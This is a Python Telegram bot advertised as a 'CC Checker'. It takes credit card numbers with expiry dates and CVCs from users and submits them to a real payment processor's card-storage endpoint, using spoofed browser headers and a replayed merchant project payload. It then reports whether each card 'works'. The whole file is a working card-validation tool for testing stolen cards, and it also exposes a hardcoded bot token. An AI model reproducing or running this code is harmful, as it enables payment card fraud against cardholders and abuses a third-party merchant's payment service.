import requests 
import os
import random
import telebot
from telebot import types
from user_agent import *

call = types.InlineKeyboardButton(text = "- Check Cards", callback_data = 's1')

call2 = types.InlineKeyboardButton(text = "- Programmer", url='t.me/Mr_majnu72 ')

bot = telebot.TeleBot("6279015768:AAHDt_Jq05lSbz-1rkkyjugPZnxhMutmXMQ")

@bot.message_handler(commands=["start"])
def start(message):
	name = message.from_user.first_name
	Keyy = types.InlineKeyboardMarkup()
	Keyy.row_width = 1
	Keyy.add(call,call2)
	bot.reply_to(message, text=f'''
- Hello bro : {name} 
- My Name Is : Satyam
- Welcome CC Checker Bot
- Chooce Any Button
''', reply_markup=Keyy)
@bot.callback_query_handler(func=lambda m:True)
def aws(call):
	if call.data == 's1':
		txt = bot.send_message(call.message.chat.id,f"- Send your Card")
		bot.register_next_step_handler(txt,check_cards)

def check_cards(message):
	   	card = message.text
	   	bot.reply_to(message, text=f'''
- Done Save Card
- Card : {card}
- Please Wait ...
''')
	   	num=card.split('|')[0]
	   	mo=card.split('|')[1]
	   	ye=card.split('|')[2]
	   	cvc=card.split('|')[3]
	   	headers={
    "Host": "sipg.micropayment.de",
    "Connection": "keep-alive",
    "Content-Length": "303",
    "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"99\", \"Google Chrome\";v\u003d\"99\"",
    "sec-ch-ua-mobile": "?1",
    "User-Agent": generate_user_agent(),
    "sec-ch-ua-platform": "\"Android\"",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Origin": "https://sipg.micropayment.de",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://sipg.micropayment.de/public/bridge/v1/iframe.php?w\u003dpan",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q\u003d0.9,ar-DZ;q\u003d0.8,ar;q\u003d0.7"}
	   	data  ={"project":"awsking","testmode":"0","fields":{"holder":"Mr Aws","month":f"{mo}","year":f"{ye}","pan":f"{num}","cvc":f"{cvc}"},"secure":{"ct":"3hH/PhgUcCKbgVlOSJYaOw9iJFGJtYIxap5uQoz0qbUzUf+BSqsqwrPAFHp5TKsalRBOT1yyjek=","iv":"6e325bfe8c76f6e0","s":"075dfcb99861e7b0","kh":"qx6+9DS+keV0GUNMc23eQg=="}}
	   	check = requests.post('https://sipg.micropayment.de/public/panstore/?function=init',json=data,headers=headers).json()
	   	token = check["token"]
	   	code = check["code"]
	   	if token != None and code == 'ok':
	   		print(check.text)
	   		bot.reply_to(message, text=f'''
- Card : {card}
- Card Status : Work
- BY : @Mr_majnu72
''')
	   	else:
	   		print(check)
	   		bot.reply_to(message, text=f'''
- Card : {card}
- Card Status : Not Work
- BY : @Mr_majnu72
''')

print ("started")
bot.infinity_polling()
